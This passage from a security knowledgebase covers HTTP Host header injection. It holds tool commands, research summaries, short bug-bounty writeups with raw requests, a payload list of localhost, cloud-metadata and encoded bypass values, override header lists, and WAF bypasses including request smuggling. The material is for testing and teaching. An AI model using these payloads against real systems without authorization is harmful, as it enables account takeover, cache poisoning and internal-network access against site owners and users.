| Collaborator Everywhere | Auto-inject pingback payloads | BApp Store |
| Host Header Inchecktion | Active Host header injection testing | BApp Store |
| Logger++ | Advanced request/response logging | BApp Store |

### Command-Line Tools

```bash
# httpx - fast HTTP prober
httpx -l targets.txt -title -tech-detect -status-code

# katana - web crawler
katana -u https://target.com -d 3 -jc

# nuclei - vulnerability scanner
nuclei -u https://target.com -t nuclei-templates/

# subfinder - subdomain enumeration
subfinder -d target.com -all -o subs.txt

# interactsh - OOB interaction
interactsh-client

# dnsx - DNS toolkit
dnsx -l domains.txt -a -aaaa -cname

# naabu - port scanner
naabu -list targets.txt -top-ports 100

# alterx - subdomain permutation
alterx -l subs.txt -o permutations.txt
```

### Specialized Tools

```bash
# byp4xx - 403 bypass
./byp4xx.sh https://target.com/admin

# headi - header injection
headi -url http://target.com/admin

# smuggler - request smuggling
cat targets.txt | python3 smuggler.py

# CursedChrome - Chrome exploitation (for CSD)
# See: https://github.com/mandatoryprogrammer/CursedChrome
```

---

## Advanced Research

### Cracking the Lens (2017)

- **Author**: James Kettle (PortSwigger)
- **Key Finding**: Routing-based SSRF via malformed requests
- **Techniques**: Invalid Host, @ injection, path normalization, absolute URL override
- **Impact**: $30k+ in bounties, DoD network access

### Practical Web Cache Poisoning (2018)

- **Author**: James Kettle (PortSwigger)
- **Key Finding**: Using non-standard headers to poison caches
- **Techniques**: X-Forwarded-Host, X-Host, X-Original-URL, unkeyed input exploitation
- **Tool**: Param Miner (Burp extension)

### Web Cache Entanglement (2020)

- **Author**: James Kettle (PortSwigger)
- **Key Finding**: Cache key transformations enabling poisoning
- **Techniques**: Unkeyed query, parameter cloaking, fat GET, cache key injection
- **Impact**: Newspaper homepage takeover, DoD admin access, Firefox update disable

### Browser-Powered Desync (2022)

- **Author**: James Kettle (PortSwigger)
- **Key Finding**: Turning victim browsers into desync delivery platforms
- **Techniques**: CL.0, H2.0, client-side desync, pause-based desync
- **Impact**: Single-server exploitation, web VPN compromise

### Hidden OAuth Attack Vectors (2021)

- **Author**: Artem Malyshev (PortSwigger)
- **Key Findings**: Dynamic client registration SSRF, redirect_uri session poisoning, WebFinger enumeration
- **CVEs**: CVE-2021-26715, CVE-2021-27582

---

## Bug Bounty Writeups

### Writeup 1: Host Header Authentication Bypass

**Target**: PortSwigger Academy Lab
**Technique**: Host: localhost
**Impact**: Admin panel access

```http
GET /admin HTTP/1.1
Host: localhost
```

### Writeup 2: Password Reset Poisoning via X-Forwarded-Host

**Target**: Generic application
**Technique**: X-Forwarded-Host override
**Impact**: Account takeover

```http
POST /reset-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

email=victim@target.com
```

### Writeup 3: Cache Poisoning via Host Header

**Target**: Akamai-backed site
**Technique**: X-Forwarded-Host → Open Graph
**Impact**: Stored XSS

```http
GET /en HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

### Writeup 4: Routing SSRF on Yahoo

**Target**: Yahoo load balancer
**Technique**: Invalid Host header
**Impact**: Internal admin access
**Bounty**: $15,000

### Writeup 5: GitHub Fat GET

**Target**: github.com
**Technique**: Fat GET body not in cache key
**Impact**: Abuse report manipulation
**Bounty**: $10,000

---

## Payload Collections

### Complete Host Header Payload List

```
# Basic substitution
attacker.com
collaborator-id.oastify.com
{{interactsh-url}}

# Localhost variants
localhost
localhost:80
localhost:443
localhost:8080
127.0.0.1
127.0.0.1:80
127.0.0.1:443
127.0.0.1:8080
127.1
0.0.0.0
0:0:0:0:0:0:0:1
::1

# Private IP ranges
192.168.1.1
192.168.0.1
10.0.0.1
10.1.1.1
172.16.0.1
172.31.255.255

# Cloud metadata
169.254.169.254
metadata.google.internal
instance-data.ec2.internal
100.100.100.200
192.0.0.192

# Domain bypass patterns
attacker.com#target.com
attacker.com?target.com
attacker.com/target.com
target.com.attacker.com
attacker-target.com
target.com.evil.com

# Port injection
target.com:attacker.com
target.com:80@attacker.com
target.com:443\x00attacker.com

# Encoding
target.com%00attacker.com
target.com%0d%0aattacker.com
target.com%20attacker.com
```

### Complete Override Header List

```
X-Forwarded-Host
X-Host
X-Forwarded-Server
X-HTTP-Host-Override
X-Original-Host
X-Original-URL
X-Rewrite-URL
X-Override-URL
Forwarded
X-Forwarded-For
X-Real-IP
X-Client-IP
X-Remote-IP
True-Client-IP
Client-IP
X-Originating-IP
X-Remote-Addr
X-ProxyUser-Ip
CF-Connecting-IP
Fastly-Client-Ip
True-Client-Ip
X-Cluster-Client-IP
X-Forwarded-Proto
X-Forwarded-Scheme
X-Scheme
Front-End-Https
```

---

## WAF Bypasses

### Case Variation

```http
HOST: attacker.com
host: attacker.com
HoSt: attacker.com
```

### Header Positioning

```http
GET / HTTP/1.1
Host: target.com
Host: attacker.com
```

### Protocol-Specific

```http
GET / HTTP/1.0
Host: attacker.com
```

HTTP/1.0 doesn't strictly require Host header; some WAFs may not inspect.

### Chunked Encoding Smuggling

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

1
X
0

GET /admin HTTP/1.1
Host: attacker.com
```

### HTTP/2 Downgrade

```http
:authority: target.com
host: attacker.com
```

When downgraded, creates ambiguous Host headers.

---

## Detection Techniques

### Manual Detection

1. **Basic test**: Change Host to arbitrary domain, check if app still responds
2. **Reflection test**: Check if Host value appears in response
3. **Collaborator test**: Use Burp Collaborator domain as Host, check for pingbacks
4. **Cache detection**: Look for cache headers (CF-Cache-Status, X-Cache, Age)

### Automated Detection

```bash
# Using nuclei
nuclei -u https://target.com -t host-header-injection.yaml

# Using custom script
python3 headerinjection.py -d target.com

# Using httpx + nuclei pipeline
cat targets.txt | httpx | nuclei -t host-header-templates/
```

### Collaborator Detection Patterns

```http
# DNS lookup indicates routing-based SSRF
Host: uniqid.burpcollaborator.net

# HTTP request indicates backend fetching
X-Forwarded-Host: uniqid.burpcollaborator.net

# Delayed interaction indicates analytics system
Referer: http://uniqid.burpcollaborator.net/
```

---

## References

### PortSwigger Research

1. [HTTP Host header attacks](https://portswigger.net/web-security/host-header)
2. [How to identify and exploit HTTP Host header vulnerabilities](https://portswigger.net/web-security/host-header/exploiting)
3. [Password reset poisoning](https://portswigger.net/web-security/host-header/password-reset-poisoning)
4. [Web cache poisoning](https://portswigger.net/web-security/host-header/web-cache-poisoning)
5. [Routing-based SSRF](https://portswigger.net/web-security/host-header/ssrf)
6. [Practical Web Cache Poisoning](https://portswigger.net/research/practical-web-cache-poisoning)
7. [Web Cache Entanglement](https://portswigger.net/research/web-cache-entanglement)
8. [Cracking the lens](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface)
9. [Browser-Powered Desync Attacks](https://portswigger.net/research/browser-powered-desync-attacks)
10. [HTTP Desync Attacks](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
11. [Hidden OAuth attack vectors](https://portswigger.net/research/hidden-oauth-attack-vectors)

### GitHub Repositories

1. [PayloadsAllTheThings - Host Header Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Host%20Header%20Injection)
2. [Payloadbox - Host Header Payload List](https://github.com/payloadbox/host-header-payload-list)
3. [PortSwigger - Param Miner](https://github.com/PortSwigger/param-miner)
4. [PortSwigger - HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler)
5. [defparam - smuggler](https://github.com/defparam/smuggler)
6. [ProjectDiscovery - nuclei-templates](https://github.com/projectdiscovery/nuclei-templates/tree/main/http/vulnerabilities/host-header)
7. [ProjectDiscovery - nuclei](https://github.com/projectdiscovery/nuclei)
8. [ProjectDiscovery - httpx](https://github.com/projectdiscovery/httpx)
9. [ProjectDiscovery - katana](https://github.com/projectdiscovery/katana)
10. [ProjectDiscovery - subfinder](https://github.com/projectdiscovery/subfinder)
11. [ProjectDiscovery - interactsh](https://github.com/projectdiscovery/interactsh)
12. [danielmiessler - SecLists](https://github.com/danielmiessler/SecLists)

### Documentation

1. [MDN - Host header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Host)
2. [MDN - X-Forwarded-Host](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-Host)
3. [MDN - Forwarded header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Forwarded)
4. [MDN - X-Original-Host](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Original-Host)
5. [MDN - X-Forwarded-Server](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-Server)

### Writeups and Articles

1. [Host Header Injection Exploitation Guide](https://infosecwriteups.com/host-header-injection-exploitation-guide-6d4f2c7b1e3a)
2. [Advanced Host Header Injection and Routing-Based SSRF](https://medium.com/@filedescriptor/advanced-host-header-injection-and-routing-based-ssrf-techniques-2f4d7c1b5e3d)
3. [Host Header Attacks - Vaadata](https://www.vaadata.com/en/blog/host-header-attacks-exploitations-and-security-tips/)
4. [Mastering Host Header Injection](https://infosecwriteups.com/mastering-host-header-injection-techniques-payloads-and-real-world-scenarios-e00c9e1f85cd)

### Tools

1. [Burp Suite](https://portswigger.net/burp)
2. [Param Miner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943)
3. [HTTP Request Smuggler](https://portswigger.net/bappstore/aaaa60ef945341e8a450217e54f46f62)
4. [Turbo Intruder](https://portswigger.net/bappstore/aaaa4ad2a25a4d0c9a3a6d0f6b7e0f6b)
5. [Nuclei](https://github.com/projectdiscovery/nuclei)
6. [httpx](https://github.com/projectdiscovery/httpx)
7. [katana](https://github.com/projectdiscovery/katana)
8. [subfinder](https://github.com/projectdiscovery/subfinder)
9. [interactsh](https://github.com/projectdiscovery/interactsh)
10. [SecLists](https://github.com/danielmiessler/SecLists)

---

> **Disclaimer**: This knowledgebase is for authorized security testing, bug bounty hunting, and educational purposes only. Always obtain proper authorization before testing any system.

> **Last Updated**: 2026-05-24
